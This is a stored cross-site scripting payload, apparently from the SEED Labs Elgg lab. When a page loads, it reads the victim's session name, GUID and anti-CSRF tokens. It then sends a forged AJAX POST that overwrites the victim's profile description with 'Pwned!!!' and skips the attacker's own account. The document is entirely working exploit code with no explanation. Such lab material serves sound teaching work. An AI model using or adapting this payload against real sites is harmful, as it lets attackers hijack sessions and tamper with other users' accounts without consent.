<script type="text/javascript">
window.onload = function(){
    // JavaScript code to access username, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
    var username="&name=" + elgg.session.user.name;
    var guid="&guid=" + elgg.session.user.guid;
    var ts="&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token="__elgg_token=" + elgg.security.token.__elgg_token;
    var about_me = "&description=Pwned!!!" + "&accesslevel[description]=2";

    var samyGuid = "59";                                            // Samy's GUID
    var content = token + ts + username + about_me + guid;
    var sendurl = "http://www.seed-server.com/action/profile/edit";
    
    // Create and send AJAX request
    // Attack works only if the victim is not Samy
    if(elgg.session.user.guid != samyGuid){
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        
        Ajax.setRequestHeader("Content-Type",
                              "application/x-www-form-urlencoded");
        Ajax.send(content);
        alert("Success!!");             // Debug
    }
}
</script>